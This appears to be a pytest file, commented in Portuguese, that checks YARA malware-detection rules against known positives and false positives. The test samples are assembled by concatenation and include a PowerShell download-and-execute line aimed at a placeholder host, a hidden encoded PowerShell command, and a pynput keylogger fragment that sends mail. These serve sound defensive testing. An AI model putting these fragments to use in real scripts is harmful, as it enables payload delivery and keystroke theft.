"""
As regras YARA viram "manual de instrucoes em codigo": cada regra tem casos
que DEVEM casar (positivos) e casos que NAO podem casar (falsos positivos
conhecidos). Se alguem afrouxar ou apertar demais uma regra, o teste avisa.

Os textos de teste sao montados em memoria, por concatenacao, para nenhum
arquivo do repositorio conter um padrao inteiro (o antivirus do sistema
nao precisa se assustar com o proprio projeto).
"""

from pathlib import Path

import pytest

yara = pytest.importorskip("yara")

from core import yara_scanner  # noqa: E402

PASTA_REGRAS = Path(__file__).resolve().parent.parent / "rules"


@pytest.fixture(scope="module")
def regras():
    return yara_scanner.compilar_regras(PASTA_REGRAS)


def casou(regras, texto: str) -> set[str]:
    return {m.rule for m in regras.match(data=texto.encode("utf-8"))}


B64_GRANDE = "QUJD" * 450  # 1800 caracteres base64 numa linha so


# ------------------------------------------------------------ positivos

def test_eicar(regras):
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}" + "$EICAR-STANDARD-ANTIVIRUS-" + "TEST-FILE!$H+H*"
    assert "EICAR_Teste" in casou(regras, eicar)


def test_dropper_powershell_download_e_execucao(regras):
    texto = (
        "I" + "EX (New-Object Net.Web" + "Client).Download" + "String('http://exemplo.invalid/a')"
    )
    assert "Powershell_Suspeito_Download_Execucao" in casou(regras, texto)


def test_dropper_powershell_stealth_e_execucao(regras):
    texto = "powershell -w hid" + "den -Enc" + "odedCommand AAAA"
    assert "Powershell_Suspeito_Download_Execucao" in casou(regras, texto)


def test_keylogger_com_exfiltracao(regras):
    texto = (
        "from pyn" + "put.keyboard import Listener\n"
        "import smtp" + "lib\n"
        "Listener(on_press=f)\n"
        "s.star" + "ttls()\n"
        "s.send" + "mail(a, b, c)\n"
    )
    assert "Python_Keylogger_Heuristica" in casou(regras, texto)


def test_base64_com_execucao(regras):
    texto = "$x = [Convert]::FromBase64" + "String('" + B64_GRANDE + "')"
    assert "Script_Base64_Suspeito" in casou(regras, texto)


# ------------------------------------------------------------ negativos (falsos positivos conhecidos)

def test_base64_grande_sozinho_nao_casa(regras):
    """Regressao do fullscan que marcou 38% dos arquivos: base64 por si so nao e ameaca."""
    assert casou(regras, B64_GRANDE) == set()


def test_certificado_pem_nao_casa(regras):
    texto = "-----BEGIN CERTIFICATE-----\n" + B64_GRANDE + "\neval(\n-----END CERTIFICATE-----"
    assert "Script_Base64_Suspeito" not in casou(regras, texto)


def test_script_que_so_baixa_arquivo_nao_casa(regras):
    texto = "Invoke-WebRequest -Uri https://exemplo.invalid/setup.zip -OutFile setup.zip"
    assert casou(regras, texto) == set()


def test_pynput_sem_exfiltracao_nao_casa(regras):
    """Um atalho de teclado legitimo usa pynput + Listener, mas nao manda e-mail."""
    texto = "from pyn" + "put.keyboard import Listener\nListener(on_press=f)\n"
    assert casou(regras, texto) == set()


def test_script_de_email_comum_nao_casa(regras):
    texto = "import smtp" + "lib\ns.star" + "ttls()\ns.send" + "mail(a, b, c)\n"
    assert casou(regras, texto) == set()
